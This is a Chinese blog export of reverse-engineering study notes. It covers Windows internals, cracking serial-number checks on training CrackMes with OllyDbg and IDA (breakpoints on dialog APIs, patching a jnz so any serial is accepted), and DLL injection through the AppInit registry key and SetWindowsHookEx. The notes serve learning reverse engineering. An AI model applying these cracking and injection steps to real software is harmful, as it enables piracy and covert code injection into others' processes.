ASCII与UNICODE字符集字符集是一个系统支持的所有抽象字符的集合。字符是各种文字和符号的总称，包括各种文字、标点符号、图形符号、数字等 Unicode是对ASCII字符编码的一个扩展，只不过在Windows中用2字节对进行编码，因此也被称为宽字符集。 Intel处理器在内存中将一个字存入存储器需要占用相继的2字节，这个字节按照小端方式存入，即低位字节存入低地址，高位字节存入高地址。 字节存储顺序 Big-endian：高位存入低地址，低位存入高地址 Little-endian：低位存入低地址，高位存入高地址 Windows操作系统Win32 API函数现在很多讲程序设计的书都是基于MFC库和OWL库的Windows设计，对Windows实现细节鲜有讨论，而调试程序是要和系统底层打交道的，所以有必要掌握一些API函数的知识 Windows运转的核心是动态链接库。Windows提供了丰富的应用程序可利用的函数接口，这些函数采用动态链接库(DLL)实现。 在早期，Windows的主要部分是由三个动态链接库实现，它们分别代表Windows的3个主要子系统，叫做Kernel、GDI、user WOW64WOW64是64位Windows操作系统的子系统，可以使大多数32位应用程序在不进行修改的情况下运行在64位操作系统上 64位的Windows，除了带有64位操作系统应有的系统文件，还有32位操作系统与的系统文件。Windows64的系统文件都放在一个叫做”system32”的文件中，Windows\\system32文件中有原生的64位映像文件，为了兼容32位系统，还增加了\\Windows\\SysWOW64文件夹，其中存储了32位的系统文件。 64位应用程序会加载System32下64位的Kernel32、User32、ntdll.dll。当应用程序加载时，WOW64建立32位Ntdll.dll所要求的环境，将CPU模式切换至32位，并开始执行32位加载器，就如同该进程运行在32位系统上一样 WOW64既不支持16位应用程序的执行(32位Windows支持16位应用程序执行)，也不支持加载32位内核模式的设备驱动程序。WOW64进程只能加载32位DLL，不能加载原生的64位DLL Windows消息机制Windows是一个消息驱动式系统。Windows消息提供在应用程序与应用程序之间、应用程序与WIndows系统之间的通信的手段。应用程序想要实现的功能由消息触发，通过对消息的相应和处理完成 系统消息队列计算机的所有输入设备由Windows监控，当一个事件发生的时候，Windows先将输入的消息放入系统消息对流额，再将输入的消息复制到相应的应用程序队列中，应用程序中的消息循环在它的消息队列中检索每个消息对发送给对应的窗口函数。一个事件从发生到到达它的窗口函数必须经历以上的步骤； SendMessage函数调用一个窗口的窗口函数，将一条消息发送给那个窗口。除非消息处理完毕，否则该函数不会返回 123456LRESULT SendMessage( HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) 返回值:由具体的消息决定，如果消息投递成功，则返回TRUE（非零） WM_COMMAND消息当用户从按钮或者菜单选择一条命令或者一个控件时该消息被发送给它的父窗口，或者一个快捷键被释放时发送 1234WM_COMMAND wNotifyCode - HIWORD(wParam), wID = LOWORD(wParam), hwndCtl = (HWND)lParam 返回值：如果应用程序处理这条消息，则返回值为0 WM_DESTROY消息当一个窗口被销毁时发送该消息，该消息的十六进制数值是02h，没有参数 返回值：如果应用程序处理这条消息，则返回值为0 WM_GETTEXT消息应用程序发送一条WM_GWTTEXT消息，将一个对应窗口的文本复制到一个由呼叫程序提供的缓冲区中 123WM_GETTEXT wParam = (WPARAM) cchTextMax; //需要复制的字符数 lParam = (LPARAM) lpszText; //接受文本的缓冲区地址 返回值：被复制的字符数 WM_QUIT消息当应用程序调用PostQuitMessage函数时，生成WM_QUIT消息， 12WM_QUIT nExitCode = (int) wParam //退出代码 返回值：这条消息没有返回值 WM_LBUTTONDOWN消息当鼠标光标停留在一个客户区切用户按下鼠标左键时，WM_LBUTTONDOWN消息将被发送，如果鼠标动作未被捕获，这条希奥希将发送给光标下的窗口；否则，将被发送给已经捕捉鼠标动作的窗口 1234WM_LUBTTONDOWN fwKeys - wParam; //key旗标 xPos = LOWORD(lParam); //光标的水平位置 yPos = HIWORD(lParam); //光标的垂直位置 返回值：如果应用程序处理了这条消息，则返回值为0 虚拟内存在默认情况下，32位Windows操作系统的地址空间在4GB以内。WIn32的平坦内存模式使每个进程都能拥有自己的虚拟空间。对32位进程来说，这个地址空间是4GB，因为32位指针拥有00000000h~FFFFFFFFh的任何值。此时，程序的代码和数据都放在同一地址空间中，不必区分代码和数据段 虚拟内存(Virtual Memory)不是真正的内存，它通过映射(map)的方法使可用虚拟地址(Virtual Address)达到4GB，每个应用程序可以获得2GB虚拟地址，剩下的2GB留给操作系统使用，在Windows NT中，应用程序设置可以获得3GB的虚拟地址； Windws是一个分时的多任务操作系统，CPU时间在被分成一个个时间片后分配给不同的程序。在一个时间片里，与这个程序的执行无关的内容不会映射到线性地址中。因此，每个程序都有自己的4GB寻址空间，互不干扰。在物理内存中，操作系统和系统DLL代码需要供每个应用程序调用，所以它们必须在任意时刻必须被映射。用户的exe程序只有在自己所属的时间片内被映射，用户DLL则有选择的映射 简单的来说，虚拟内存实现和过程如下： 当一个应用程序启动时，操作系统就创建一个进程，并给该进程分配2GB虚拟地址(不是内存，只是地址) 虚拟内存管理器将应用程序的代码映射到那个应用程序的虚拟地址中的某个位置，并把当前需要的代码读入屋里地址 如果使用DLL，DLL也会被映射到进程的虚拟地址空间中，有需要的时候才会被读入物理内存 其他项目(数据、堆栈等)的空间也是从屋里内存中分配的，并将映射到虚拟地址空间中 其他程序通过使用其虚拟地址空间中的地址开始执行，然后，虚拟内存管理器把每次内存访问映射到物理位置 应用程序不会直接访问物理地址 虚拟内存管理器通过虚拟地址的访问请求来控制所有的物理地址访问 每个应用程序都有独立的4GB寻址空间，不同应用程序的地址是彼此隔离的 DLL程序没有“私有”空间，它们总是被映射到其他应用程序的地址空间中，作为其他应用程序的一部分运行。其原因是：如果DLL不与其他程序处于同一个地址空间，应用程序就无法调用它","link":"/2019/11/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"title":"加密与解密-演示版保护技术","text":"一个软件的开发是需要很多软件开发者的努力的，所以更多的学习保护自己的智力成果不被别人所窃取，这就是这一章的主要主题 序列号保护 以用户名等信息作为自变量，通过函数F变换之后得到注册码 通过注册码验证用户名的正确性 使用对等函数检查注册码 同时采用用户名和序列号作为自变量，即采用二元函数 攻击序列号保护若要找到序列号，后者修改判断序列号之后的跳转指令，最重要的是利用各种工具来定位判断序列号的代码段。 跟踪注册码之后的判断找到注册码。用户在编辑框中输入注册码，软件需要协调一个API来将用户输入的注册码复制到自己的缓冲区。利用调试器针对API设置断点的功能，就能找到判断注册码的地方。 常用的注册包括但不限于: GetWindowTextA(W) GetDlgItemTextA(W) GetDlgItemInt Hmemcpy(仅Windows 9x/Me) 程序完成对注册码的判断后，一般会提示一个对话框，告诉用户是否输入正确，这里也是一个切入点： MessageBoxA(W) MessageBoxEwA(W) ShowWindow MessageBoxIndirectA(W) CreateDialogParamA(W) CreateDialogIndirectParamA(W) DialogBoxParamA(W) DialogBoxIndirectParamA(W) 另一种方法是个跟踪程序启动时对注册码的判断过程，从而决定是否以注册码的模式工作。根据序列号存放位置的不同，可以使用不同的API断点，如果序列号存放在注册表中，可以使用注册表操作API。如果序列号在文本中，可以使用文本操作API。 数据约束性的秘诀在大多数的序列号保护程序中，那个真正的、正确的序列号会于某个时刻出现在内存中。当然它的位置不是固定的，但大多数情况下它都会有一个范围，即存放用户输入的序列号的内存地址+-90h字节的地方。 Hmemcpy函数hmemcpy函数(万能断点)是Windows 9X系统的内部函数，它的作用是将内存中的一块数据复制到另一个地方。由于9x系统频繁使用该函数处理各种字符串，将该函数作为断点是十分常用的。 消息断点许多序列号保护软件都有一个按钮，当按下和释放鼠标的时候，将发送消息，因此利用这个消息下断点很容易找到按钮的事件代码。 提示信息目前大多数软件都使用了人机对话，用OllyDbg打开实例，在弹出的快捷键菜单中执行”Search for –&gt; All referenced text strings”命令，OllyDbg将列出程序中出现的字符串。 字符串比较形式在序列号分析过程中，字符串的处理是一个重点， 因此我们需要掌握一定的分析技能。 寄存器比较123mov eax [] ;eax或ebx中存放的是直接比较的两个数，一般是十六进制数mov ebx [] ;同上cmp eax,ebx ;直接比较两个寄存器 函数比较12345mov eax [] ;比较数字直接放在eax中，一般是十六进制数，也可能是地址mov ebx [] ;同上call xxxx ;用于比较功能的函数，可以是API函数，也可以是作者自己写的比较函数test eax eax ;比较jz(jnz) call一般是一个bool函数，其结果通过eax返回，要关注该call指令返回时处理eax的代码。 1234567cmp xxx,xxxjz Lable xor eax,eax ;将eax清零Lable :pop edi pop esi pop ebp ret ;函数返回 函数比较12345push xxxx ;参数1，可以是地址，也可以是寄存器push xxxx ;参数2call xxxxx ;用户比较的函数，可以是APItest eax,eax ;计算比较后的标志寄存器jz(jnz) ;跳转 串比较1234lea edi [] ;edi指向字符串alea esi [] ;esi指向字符串brepz cmpsd ;比较字符串a和bjz(jnz) ;比较跳转 注册机明码比较的攻击只要正确的序列号曾以明码的方式出现，就都属于这一类，有些软件采用了一机一码的保护方式，即软件根据用户硬件等产生的唯一机器码，注册码与机器号对应，有效地防止了序列号被散发。 非明码比较1234567891000401228 . 68 8E214000 push serial.0040218E ;我们输入的用户名SYSTEMK1t入栈0040122D . E8 4C010000 call serial.0040137E ;计算k1，k1=F1(用户名) 00401232 . 50 push eax ;k1入栈00401233 . 68 7E214000 push serial.0040217E ; 我们输入的字符串密码12345入栈00401238 . E8 9B010000 call serial.004013D8 ;计算k20040123D . 83C4 04 add esp,0x4 ;平衡栈00401240 . 58 pop eax ;k1出栈00401241 . 3BC3 cmp eax,ebx ;比较k1和k2，即F1(用户名)=F2（序列号）00401243 . 74 07 je short serial.0040124C ;如果相等，注册成功00401245 . E8 18010000 call serial.00401362 ;如果不相等，失败 call 0040137E内部函数实现： 12345678910111213141516171819202122232425262728293031323334353637380040137E /$ 8B7424 04 mov esi,dword ptr ss:[esp+0x4] ; 将Name地址放入esi00401382 |. 56 push esi ; 将esi压入栈00401383 |&gt; 8A06 /mov al,byte ptr ds:[esi] ; 取Name的第一个字节00401385 |. 84C0 |test al,al ; 判断Name中是否还有字符00401387 |. 74 13 |je short serial.0040139C00401389 |. 3C 41 |cmp al,0x41 ; 判断是否输入的是字符并且是否大于410040138B |. 72 1F |jb short serial.004013AC0040138D |. 3C 5A |cmp al,0x5A ; 判断输入的字符是否大于字母Z0040138F |. 73 03 |jnb short serial.00401394 ; 如果是小写字母，则跳转到0040139400401391 |. 46 |inc esi ; 将指针移动到下一字符00401392 |.^ EB EF |jmp short serial.0040138300401394 |&gt; E8 39000000 |call serial.004013D2 ; 将小写字母转换为大写00401399 |. 46 |inc esi ; 将指针移动到下一字符0040139A |.^ EB E7 \\jmp short serial.004013830040139C |&gt; 5E pop esi ; esi出栈,即esi重新指向Name首位0040139D |. E8 20000000 call serial.004013C2 ; 对Name进行变形处理004013A2 |. 81F7 78560000 xor edi,0x5678 ; 将刚刚得到的字符串与5678h进行亦或运算004013A8 |. 8BC7 mov eax,edi ; 将结果存入eax，准备结束对比函数004013AA |. EB 15 jmp short serial.004013C1004013AC |&gt; 5E pop esi ; 如果输入的不是字符，出错004013AD |. 6A 30 push 0x30 ; /Style = MB_OK|MB_ICONEXCLAMATION|MB_APPLMODAL004013AF |. 68 60214000 push serial.00402160 ; |Error!004013B4 |. 68 69214000 push serial.00402169 ; |Incorrect!,Try Again004013B9 |. FF75 08 push [arg.1] ; |hOwner = 000A029E ('CrackMe v1.0',class='No need to disasm the code!')004013BC |. E8 79000000 call &lt;jmp.&amp;USER32.MessageBoxA&gt; ; \\MessageBoxA004013C1 \\&gt; C3 retn004013C2 /$ 33FF xor edi,edi ; 将edi清零004013C4 |. 33DB xor ebx,ebx ; 将ebx清零004013C6 |&gt; 8A1E /mov bl,byte ptr ds:[esi] ; 取esi所指的Name的1位到b1004013C8 |. 84DB |test bl,bl ; Name中是否还有字符004013CA |. 74 05 |je short serial.004013D1 ; 计算有没有结束004013CC |. 03FB |add edi,ebx ; edi=edi+ebx(依次将Name字符相加)004013CE |. 46 |inc esi ; 将指针移向下一个字符004013CF |.^ EB F5 \\jmp short serial.004013C6004013D1 \\&gt; C3 retn004013D2 /$ 2C 20 sub al,0x20 ; 将ASCII值减去20,,将小写字符转换为大写字母004013D4 |. 8806 mov byte ptr ds:[esi],al ; 将转换后的字母放回[esi]中004013D6 \\. C3 retn 004013D8函数内部实现代码： 123456789101112131415004013D8 /$ 33C0 xor eax,eax ; 清零004013DA |. 33FF xor edi,edi ; 清零004013DC |. 33DB xor ebx,ebx ; 清零004013DE |. 8B7424 04 mov esi,dword ptr ss:[esp+0x4] ; esi指向输入的序列号code[i]004013E2 |&gt; B0 0A /mov al,0xA ; 将10放入al寄存器中004013E4 |. 8A1E |mov bl,byte ptr ds:[esi] ; 取出code[i]中的数字并放到bl寄存器中004013E6 |. 84DB |test bl,bl ; 取出code[i]中是否还有数字004013E8 |. 74 0B |je short serial.004013F5 ; 计算结束，跳转到004013F5处004013EA |. 80EB 30 |sub bl,0x30 ; ebx=bl-30=code[i]-30h004013ED |. 0FAFF8 |imul edi,eax ; edi=edi*10,实际上是左移1位004013F0 |. 03FB |add edi,ebx ; edi=edi+ebx+edi+(code[i]-30h)004013F2 |. 46 |inc esi ; 指向code的下一个字符，esi相当于i004013F3 |.^ EB ED \\jmp short serial.004013E2 ; 循环，继续计算004013F5 |&gt; 81F7 34120000 xor edi,0x1234 ; 将edi与1234h异或运算004013FB |. 8BDF mov ebx,edi ; 将结果存入ebx中，准备推出子程序 警告窗口","link":"/2019/12/27/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86-%E6%BC%94%E7%A4%BA%E7%89%88%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/"},{"title":"加密与解密-静态分析","text":"高级语言编写的程序有两种形式。一种是被编译成机器语言在CPU上执行的，例如VC++，机器语言与汇编语言几乎是对应的，因此可以将机器语言转化为汇编语言，这个过程称为反汇编。另一种是一遍解释一遍执行，例如VB、Java。所谓静态分析，是通过反汇编、反编译手段获得程序汇编代码或源代码，然后根据程序清单分析程序执行流程。 文件类型分析逆向第一步就是分析程序的类型，了解程序是什么语言编写的或者是用什么编译器编译器编译的，以及程序是否被某种加密程序处理过，菜能进行下一步工作； PEiD提供了一个扩展文件接口userdb.txt，用户可以自定义一些特征码，这样就而可以识别新的文件类型了。 反汇编引擎反汇编引擎的作用是把机器码解析成汇编指令。开发反汇编引擎需要对Intel的i386机器指令有深入的了解。 OllyDbg的ODDisasmOllyDbg自带的反汇编引擎ODDisasm，优点是具有汇编接口(即文本解析，将文本字符串解析并编码成二进制)，这个特性曾经独树一帜。这些年出现的x64_dbg，支持的指令集更加完整，Bug更少，同时支持x64平台。 BeaEngineBeadEngine的编码风格杂乱，例如对各种变量强制转换及使用多种明明风格 Udis86CapstoneCapstone可以说是所有反汇编引擎中的最大成者。因为Capstone移植自LLVM框架的MC组建的一部分。 AsmJit以C++疯狂的完整的JIT汇编器和编译器，它支持兼容x86和x64框架的原生汇编指令 静态反汇编在进行返回不值钱，使用PEiD等检测工具分析一下文件是否加壳了。常用的反汇编工具有IDA Pro等。 IDA Pro简介IDA Pro是Hex-Rays公司开发的，它是一款交互式反汇编工具，它功能强大、操作复杂，需要完全掌握它，需要具备很多知识。 IDA是按照区块装载文件，例如.text(代码块)、.data(数据块)、.idata(输入表)和.edata(输出表)等 IDA分析程序一般分为两个阶段: 将程序的代码和数据分开，分别标识函数并分析其参数调用，分析跳转、调用等指令关系并给标签赋值等。 IDA如果能够识别文件的编译类型，就能装载对用的编译器特征文件，然后给各函数赋名。 IDA会创建一个数据库，其组建分别保存在扩展名为：.id0、id1、.nam和.til的四个文件，这些文件格式为IDA专用，在关闭当前项目时，这4个文件保存为一个IDB文件。 IDA的配置在IDA的cfg目录下查找IDA配置文件”ida.cfg”和GUI配置文件”idagui.cfg”。 反汇编选项 ASCII字符串与符号要设置ASCII字符串风格，可单击Options -&gt; ASCII String styles选项，打开字符串设置窗口 显示中文字符IDA7.0开始支持中文字符串的显示，但仍需配置ida.cfg。在IDA\\CFG目录下新建一个文件Chinese.clt，内容如下： 123456789101112u2000..u206F,u2F00..u2FDF,u3000..u303F,u31C0..u31EF,u3400..u4DBF,u4E00..u9FFF,uF900..uFAFF,uFE30..uFE4F,u20000..u2A6DF,u2A700..u2BA7F,u2B740..u2B81F,u2F800..u2FA1F; 修改IDA.cfg文件中的 ENCODING_CULTURES项目.添加一条GB2312:Chinese, 注意格式别写错.这里的Chinese对应上面保存的clt文件.不需要.clt扩展名. 1234567891011121314ENCODING_CULTURES = 1250: Central_Europe, 1251: Cyrillic, 1252: Latin_1, 1253: Greek, 1254: Turkish, 1255: Hebrew, 1256: Arabic, 1257: Baltic, 1258: Vietnam, 874: Thai, GB2312: Chinese, //这里是添加的. cp863: Latin_1 Greek; IDA主窗口IDA分析完目标程序后进入主窗口，界面看上去专业且复杂。 反汇编窗口IDA-VIEW是反汇编代码的显示窗口，它有两种形式，分别是图形视图(默认)和文本视图。 导航栏View-&gt;Toolbars 注释使用IDA可以方便的在代码后面插入注释。在窗口右边空间处右键，将显示输入注释的快捷菜单，一个是”Enter comment”，另一个是”Enter repeatable comment”。按；键输入的注释在所有交叉参考处都会出现，按:键输入的注释旨在该处出现。 提示窗口字符串窗口可以通过点击”View-&gt;Open Subviews-&gt;Strings”选项打开该字符串窗口。 输入窗口输入窗口中列出了可执行文件调用的所有函数。输入窗口中的每个条目都列出了一个函数名称，以及包含该函数库的名称，每个条目列出的地址为相关函数的虚拟地址； 跳转到地址窗口G快捷键，若知道目标地址，可以直接跳转到address 交叉参考通过交叉参考可以知道指令代码相互调用的关系。 比如这条指令”CODE XREF: sub_401120+B↑j”，标识调用的地址是00401120h，j表示跳转。o表示偏移量，p代表子程序。双击或按Enter可以跳转到调用该处的地方。 参考重命名参考重命名是IDA中一个极好的功能，它可以将反汇编清单中的一些默认名称更改为有意义的名称，增加了代码的可读性。 我们继续修改刚才的那个函数名 Local name：局部符号名的作用于仅限当前函数 Include in names list:勾选这个选项，将有一个名称被添加到名称窗口中 Public name:由二进制文件(例如DLL)输出的名称 Autogenerated name:自动创建符号名 Weak name:弱符号，是公共符号的一种特殊形式 标签的用法单击菜单项”Jump”-&gt;”Mark position”，打开”标记当前位置”功能； 使用Ctrl+M可以快速回到标记的位置 格式化指令操作数IDA可以格式化指令使用的常量，因此应尽可能使用符号名称而非鼠族，从而使反汇编代码更具有可读性，IDA根据被反汇编指令的上下文、所使用的数据做出格式化决定。 函数操作IDA允许手动干预创建、编译、删除函数。新韩淑由不属于某个函数的现有指令创建，或者由未被IDA以任何方式定义的原始数据创建 “Edit”-&gt;”Functions”-&gt;”Create Function” 快捷键p 代码和数据转换很多工具在进行反汇编的时候可能无法正确的区分数据和代码，IDA也不例外，数据字节可能会被错误底识别为代码字节，而代码字节也会可能会被错误的识别成数据字节。 如果确信某段16进制数据是一段指令，只要将光标移动其第一个字节的偏移位置，执行菜单命令”Edit”-&gt;”Code”或者按C即可。 按”P”键可以将某段代码定义为子程序，并列出参数调用，如果要取消定义，可以执行菜单命令”Edit”-&gt;”Undefine”或按U 在代码行按”D”键，数据类型会在”db”、”dw”和”dd”之间切换。执行菜单命令”Options”-&gt;”Setup data types” 字符串编程语言的不同造成了字符串格式的不同，例如以”0”结尾的c语言字符串以及以”$”结尾的DOS字符串等。IDA支持所有字符串格式。 如果确信某段十六进制数据是一个字符串，那么只要将光标移动到第一个字符的偏移位置，执行菜单命令”Edit”-&gt;”Strings”-&gt;”Ascii”或者按”A”即可 数组IDA有着较强的数组聚合能力。他能够将一串数据声明编程一个反汇编行，按数组的形式显示，从而简化反汇编的代码清单。 用IDA打开实例Arrays.exe数组用C语言描述，代码如下： 1static int a[a]={0x11,0x22,0x33}; 汇编代码如下： 1.text:00401009 8B B8 30 70 40 00 mov edi, dword_407030[eax] 其中，409030是一个数组，可以查看一下 123456789.data:00407030 11 00 00 00 dword_407030 dd 11h ; DATA XREF: _main:loc_401009↑r.data:00407034 22 db 22h ; &quot;.data:00407035 00 db 0.data:00407036 00 db 0.data:00407037 00 db 0.data:00407038 33 db 33h ; 3.data:00407039 00 db 0.data:0040703A 00 db 0.data:0040703B 00 db 0 将光标移动到需要处理的数据出，选择菜单项”Edit”-&gt;”Array”或者按”*”键，打开数组排列调用窗口。 然后查看排列好的数组 1.data:00407030 11 00 00 00 22 00+dword_407030 dd 11h, 22h, 33h ; DATA XREF: _main:loc_401009↑r 结构体在C语言中，结构体是一种数据结构，可以将不同类型的数据组合到一个符合的数据结构中。结构体可以被声明为变量、指针或数组等，从而实现比较复杂数据结构。 创建结构体对于一些常见的文件类型，IDA会自动加载相应的类型库，例如vc6win(Visual C++ 6.0)。在进行底层分析时，可以增加mssdk(Windows.h)、ntddk(ntddk.h)。这些库类型中有相对应的结构体，用户分析的时候可以直接引用。**”Shift+F11”** 此时就可以查看内置的结构体数据结构了。选择”View”-&gt;”Open subviews” -&gt; “Structures”菜单项，打开结构体管理窗口。按”Insert”键，在弹出的窗口中点击”Add Standard Structure”按钮，打开添加标准结构体库窗口，查找需要的结构名，就可以正常使用这些库。 IDA会通过各种措施来改善结构体的可读性，如果程序正在使用某个结构体，而IDA并不了解布局，IDA将允许用户自定义结构体，并将自定义的结构体放到反汇编代码清单中 枚举类型可以在返回时用IDA动态定义和操作枚举类型。 123456789101112131415#include &lt;iostream&gt;using namespace std;int main(void){ enum weekday { MONDAY,TUESDAY,WEDNESDAY,THUSDAY,DRIDAY,SATURDAY,SUNDAY }; printf(&quot;%d,%d,%d,%d,%d,%d,%d&quot;, MONDAY, TUESDAY, WEDNESDAY, THUSDAY, DRIDAY, SATURDAY, SUNDAY); system(&quot;pause&quot;); return 0;} 添加过后的结构体就是这样的： 可以在操作数类型中重新定义现有结构。将光标转到需要重新定义的数据处，可以”Edit”-&gt;”Operand types”-&gt;”Enum member”或按”M”键将其转换为指定的枚举成员，有可以在选中数据后执行右键快捷菜单中的”Symbolic constant”命令 变量IDA调试器远程调试Windows xp打开IDA的Debugger，选择run，然后Remote Windows debugger 被调试的机器一定要先运行win32_remote.exe CrackMe一个简单CrackMe，书里带着的，就做一下，也不需要动态调试，我们为了分析它的代码流程 将程序载入IDA中，然后Shift+F12，程序比较小，直接向下翻就可以看到成功与失败 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768.text:00401040 ; INT_PTR __stdcall DialogFunc(HWND, UINT, WPARAM, LPARAM).text:00401040 DialogFunc proc near ; DATA XREF: sub_401020+6\u0018o.text:00401040.text:00401040 String2 = byte ptr -14h.text:00401040 var_10 = byte ptr -10h.text:00401040 String = byte ptr -0Ch.text:00401040 var_B = dword ptr -0Bh.text:00401040 var_7 = dword ptr -7.text:00401040 var_3 = byte ptr -3.text:00401040 hDlg = dword ptr 4.text:00401040 arg_4 = dword ptr 8.text:00401040 arg_8 = dword ptr 0Ch.text:00401040.text:00401040 sub esp, 14h.text:00401043 xor eax, eax.text:00401045 mov ecx, dword_403034.text:0040104B mov dl, byte_403038.text:00401051 mov [esp+14h+var_B], eax.text:00401055 mov [esp+14h+var_7], eax.text:00401059 mov [esp+14h+String], 0.text:0040105E mov [esp+14h+var_3], al.text:00401062 mov eax, [esp+14h+arg_4].text:00401066 sub eax, 10h.text:00401069 mov dword ptr [esp+14h+String2], ecx.text:0040106D mov [esp+14h+var_10], dl.text:00401071 jz loc_401162.text:00401077 sub eax, 100h.text:0040107C jz loc_401121.text:00401082 dec eax.text:00401083 jnz loc_40116D.text:00401089 mov eax, [esp+14h+arg_8].text:0040108D and eax, 0FFFFh.text:00401092 sub eax, 3EAh.text:00401097 jz short loc_401105.text:00401099 sub eax, 0Bh.text:0040109C jnz short loc_401116.text:0040109E mov ecx, [esp+14h+hDlg].text:004010A2 lea eax, [esp+14h+String].text:004010A6 push 0Bh ; cchMax.text:004010A8 push eax ; lpString.text:004010A9 push 3E8h ; nIDDlgItem.text:004010AE push ecx ; hDlg.text:004010AF call ds:GetDlgItemTextA.text:004010B5 lea edx, [esp+14h+String2].text:004010B9 lea eax, [esp+14h+String].text:004010BD push edx ; lpString2.text:004010BE push eax ; lpString1.text:004010BF call ds:lstrcmpA ;字符串比较.text:004010C5 test eax, eax ;判断是否相等.text:004010C7 push 0 ; uType.text:004010C9 jnz short loc_4010E8.text:004010CB push offset Caption ; &quot;OK!&quot;.text:004010D0 push offset Text ; &quot;恭喜你！&quot;.text:004010D5 push 0 ; hWnd.text:004010D7 call ds:MessageBoxA.text:004010DD mov eax, 1.text:004010E2 add esp, 14h.text:004010E5 retn 10h.text:004010E8 ; ---------------------------------------------------------------------------.text:004010E8.text:004010E8 loc_4010E8: ; CODE XREF: DialogFunc+89\u0018j.text:004010E8 push offset aError ; &quot;ERROR!&quot;.text:004010ED push offset asc_403000 ; &quot;.text:004010F2 push 0 ; hWnd.text:004010F4 call ds:MessageBoxA.text:004010FA mov eax, 1.text:004010FF add esp, 14h.text:00401102 retn 10h 我们需要做的只是把jnz修改一下，改为jz或者nop都可以 此时，我们输入错误的序列号，也可以弹出成功的窗口","link":"/2019/11/22/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"},{"title":"插入DLL和挂钩子","text":"在Windows操作系统中，每个进程都有它自己的私有地址空间。当使用指针来引用内存时，指针的值将引用你自己进程的地址空间中的一个内存地址。你的进程不能创建一个其引用属于另一个进程的内存指针。 Windows在运行的各个进程共享2GB的地址空间，该地址空间从0x80000000至0xFFFFFFFF。只有内存映像文件和系统组件才能映射到这个区域。 有些情况下，必须打破进程的界限，访问另一个进程的地址空间，这些情况包括： 当你想要为另一个进程创建的窗口建立子类时 当你需要调试帮助时(例如，当你需要确定另一个进程正在使用那个DLL时) 当你想要挂接其他进程时 当你的DLL进入另一个进程的地址空间，就可以对另一个进程为所欲为 插入DLL：一个例子建立子类就能够改变窗口的行为特性。若要建立子类，只需要调用SetWindowLongPtr函数，改变窗口的内存块中的窗口进程地址，指向一个新的WndProc。 1SetWindowLongPtr(hwnd,GWLP_WNDPROC,MySunclassProc); 当系统需要将消息发送到指定窗口的WndProc时，要查看它的地址，然后直接调用WndProc。 参数说明： hWnd：窗口句柄，间接给出窗口所属的类。 nlndex：指定将设定的大于等于0的偏移值。有效值的范围从0到额外类的存储空间的字节数减去一个整型的大小(-sizeof(int))。要设置其他任何值，可以指定下面值之一：[1] nlndex 说明 GWL_EXSTYLE 设定一个新的扩展风格。更多信息，请见CreateWindowEx。 GWL_STYLE 设定一个新的窗口风格。 GWL_WNDPROC 为窗口过程设置一个新的地址。 GWL_HINSTANCE 设置一个新的应用程序实例句柄。 GWL_ID 设置一个新的窗口标识符。 GWL_USERDATA 设置与该窗口相关的用户数据。这些用户数据可以在程序创建该窗口时被使用。用户数据的初始值为0。 当hWnd参数标识了一个对话框时，也可使用下列值： DWL_DLGPROC 设置对话框过程的新地址。 DWL_MSGRESULT 设置对话框中的消息处理程序的返回值。 DWL_USER 设置的应用程序所私有的新的额外信息，例如句柄或指针。 dwNewLong：指定的替换值。 使用注册表来插入DLL如果你曾经多少使用过Windows操作系统，你肯定熟悉注册表的情况。整个系统的配置都是在注册表中维护的，可以通过调整它的设置来改变系统的行为特性。 1计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows 该关键字的值包含了一个DLL文件名或者一组DLL文件名。由于空格用来将文件名分割，因此避免使用包含空格的文件名。列出的第一个DLL文件名可以包含一个路径，但是包含路径的其他DLL将会被忽悠。由于这个原因，最好将你的DLL放入WIndows的系统目录，这样就不必设定路径。 当操作系统重新启动及Windows初始化的实话，系统将保留这个值。 所以在我们做插入DLL插入的实话，可以将自己的DLL存放到Windows系统目录下，然后修改这个关键字的值，这样不管操作系统怎么初始化，我们的DLL总可以发挥效果。 DLL在注册表中的操作： user32.dll库被映射到进程中，它会收到一个DLL_PROCEE_ATTACH的通知，当这个通知被处理的实话，user32.dll便检索保存这个关键字的值，并i企鹅字符串中指定每个DLL调用LoadLibrary函数 当每个库被加载的实话，便可以调用DllMain函数，其fdwReason的值就是DLL_PROCESS_ATTACH，这样每个库就可以自己初始化 由于插入的DLL在进程中很早就加载了，调用Kernel32.dll中的函数并不会有问题，user32.dll并不会检查每个库是否加载成功，或者初始化成功 使用Windows函数挂钩来插入DLL可以使用挂钩将DLL插入进程的地址空间。DLL能够插入另一个进程的地址空间中。 123456HHOOK hHook = SetWindowsHookEx( WH_GETMESSAGE, //指定安装的挂钩的类型 GetMsgProc, //指明窗口处理一个消息时系统应该调用的函数地址 hinstDll, //用于标识DLL被映射到的进程的地址空间中的虚拟内存地址 0 //指明要挂接的线程 ); 进程B中的一个线程准备将一个消息发送到一个窗口 系统查看该线程是否安装了WH_GETMESSAGE挂钩 系统查看包含GetMsgProc函数的DLL是否已经被映射到进程B的地址空间中 如果该DLL尚未被映射，系统将强制该DLL映射到进程B的地址空间，并且将进程B中的DLL映像的自动追踪计数递增1 当DLL的hinstDll用于进程B时，系统查看该函数，并检查该DLL的hinstDll是否与它用于进程A时所处的位置相同 系统将进程B中的DLL映像的自动追踪计数递增1 系统调用进程B的地址空间中的GetMsgProc函数 当GetMsgProc函数返回时，系统将进程B中的DLL映像的自动追踪计数递减1 如果当你需要卸载这个钩子的实话，使用下面的函数： 1BOOL UnhookWindowsHookEx(HHOOk hhook); 当一个线程调用UnhookWindowsHookEx函数时，系统将遍历它必须将DLL插入到各个进程的内部列表，并且对DLL的自动追踪计数进行递减。当自动追踪递减为0的时候，DLL就自动从进程的地址空间中被删除 这说明撤销窗口的子类并不能立即撤销挂钩,钩子必须在该子类的寿命期内保持有效. 使用该函数可以获取到窗口控件的句柄 1hwndLV = GetFirstChild(GetFirstChild(FindWindow(__TEXT(&quot;ProgMan&quot;),NULL))); 